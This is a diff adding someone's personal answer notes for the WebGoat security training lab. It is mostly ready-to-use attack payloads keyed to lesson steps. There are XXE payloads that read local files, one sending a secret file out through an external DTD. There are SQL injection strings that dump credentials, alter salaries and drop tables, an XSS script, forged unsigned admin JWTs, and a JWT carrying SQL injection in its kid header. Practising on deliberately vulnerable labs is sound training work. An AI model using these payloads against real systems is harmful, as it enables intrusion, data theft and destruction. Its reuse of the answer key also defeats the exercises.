@@ -1,0 +1,137 @@
+
+docker pull webgoat/goatandwolf
+docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf
+WebGoat will be located at: http://127.0.0.1:8080/WebGoat
+netstat -ano | findstr :8080
+taskkill /PID <PID> /F
+
+
+docker pull webgoat/webgoat-8.0
+docker run -p 8080:4444 -t webgoat/webgoat-8.0
+http://localhost:4444/WebGoat/login
+
+sens data expo:
+http.request.method=="POST"
+Sensitive Data Exposure occurs when an organization unknowingly exposes sensitive data or when a security incident leads to the accidental or unlawful destruction, loss, alteration, or unauthorized disclosure of, or access to sensitive data. Such Data exposure may occur as a result of inadequate protection of a database, misconfigurations when bringing up new instances of datastores, inappropriate usage of data systems and more.Data exposure happens when data is left unencrypted in a database or server accessible to anyone.Sensitive data can include anything from personally identifiable information (PII), like social insurance numbers, to banking information, to login credentials.If websites don’t use Secure Sockets Layer (SSL) and don’t have HTTPS security on sites that store information, data is also in danger of being exposed.
+Sensitive Data Exposure can of the following three types:
+Confidentiality Breach: where there is unauthorized or accidental disclosure of, or access to, sensitive data.
+Integrity Breach: where there is an unauthorized or accidental alteration of sensitive data.
+Availability Breach: where there is an unauthorised or accidental loss of access to, or destruction of, sensitive data. This will include both the permanent and temporary loss of sensitive data.
+
+xxe 4:
+<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+xxe7:
+<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+xxe11:
+<?xml version="1.0" encoding="UTF-8"?>  
+<!DOCTYPE xxe [  
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt" >  
+<!ENTITY % dtd SYSTEM "http://0.0.0.0:9090/files/username/attack.dtd" >  
+%dtd;]>  
+<comment>  
+<text>test&send;</text>  
+</comment>
+
+attack.dtd:
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://0.0.0.0:9090/landing?%file;' >" >%all;
+
+WebGoat 8.0 rocks... (NcsKQXWFe)
+
+
+sql intro:
+2
+SELECT department FROM employees WHERE first_name='Bob'
+3
+UPDATE employees SET department='Sales' WHERE first_name='Tobi'
+4
+ALTER TABLE employees ADD phone varchar(20)
+5
+GRANT SELECT ON grant_rights TO unauthorized_user 
+9
+SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+Smith' or '1' = '1
+10
+SELECT * From user_data WHERE Login_Count = 0 and userid= 0 OR 1=1
+0
+0 OR 1=1
+11
+Smith' or 1=1 --      in employee name
+3SL99A -         in Authentication TAN
+or
+Employee Name: A
+Authentication TAN: ' OR '1' = '1
+12
+Employee Name: A
+Authentication TAN: '; UPDATE employees SET salary=99999 WHERE first_name='John
+13
+%'; DROP TABLE access_log;--
+
+sql advanced:
+3
+Name: '; SELECT * FROM user_system_data;-- or ' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--
+Password: passW0rD
+5
+tom or Tom
+thisisasecretfortomonly
+6
+4,3,2,3,4
+
+sql mitigation:
+5
+getConnection, PreparedStatement, prepareStatement, ?, ?, setString, setString
+6
+try {  
+     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
+     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
+     ps.setString(1, "Admin");  
+     ps.executeUpdate();  
+} catch (Exception e) {  
+     System.out.println("Oops. Something went wrong!");  
+}
+9
+a';/**/select/**/*/**/from/**/user_system_data;--
+10
+a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--
+
+12
+104.130.219.202
+
+cross site: Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code.
+7:
+<script>alert("sri")</script>
+10:
+start.mvc#test/
+11:
+http://localhost:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>
+12:
+4,3,1,2,4
+
+broken auth
+jwt tokens:
+5:
+eyJhbGciOiJOb25lIn0.eyJpYXQiOjE2NDY2Mzk2MjAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+
+or
+
+eyJhbGciOiJOb25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2NDY2NzU0NTQsDQogICJ1c2VyIiA6ICJUb20iDQp9.
+
+10:
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTY0NjAzNTQyNSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.
+
+or
+
+eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogImZhbHNlIiwNCiAgImV4cCIgOiAxNjQ2MDY5NzY0LA0KICAiaWF0IiA6IDE1MjYxMzE0MTEsDQogICJ1c2VyIiA6ICJUb20iDQp9.
+
+11:
+ABC' UNION SELECT 'xyz' FROM INFORMATION_SCHEMA.SYSTEM_USERS; --
+
+
+eyJ0eXAiOiJKV1QiLCJraWQiOiJBQkMnIFVOSU9OIFNFTEVDVCAnVTNKcCcgRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTOyAtLSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTY0NjAzNTQyNSwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.IqqGA7zOFmzHHtwTr_V2RQcO4Z2iknMMajQbWQ1CkyY
+
+or
+
+eyJhbGciOiJIUzI1NiIsImtpZCI6IkFCQycgVU5JT04gU0VMRUNUICdVM0pwJyBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5TWVNURU1fVVNFUlM7IC0tIiwidHlwIjoiSldUIn0.ew0KICAiRW1haWwiIDogInRvbUB3ZWJnb2F0LmNvbSIsDQogICJSb2xlIiA6IFsgIkNhdCIgXSwNCiAgImF1ZCIgOiAid2ViZ29hdC5vcmciLA0KICAiZXhwIiA6IDE2NDYwNjk3NjQsDQogICJpYXQiIDogMTUyNDIxMDkwNCwNCiAgImlzcyIgOiAiV2ViR29hdCBUb2tlbiBCdWlsZGVyIiwNCiAgInN1YiIgOiAidG9tQHdlYmdvYXQuY29tIiwNCiAgInVzZXJuYW1lIiA6ICJUb20iDQp9.xvTofGs7DKaDvHZBVWq2aSJHT2R2lVqPUD5CN2NcMu4
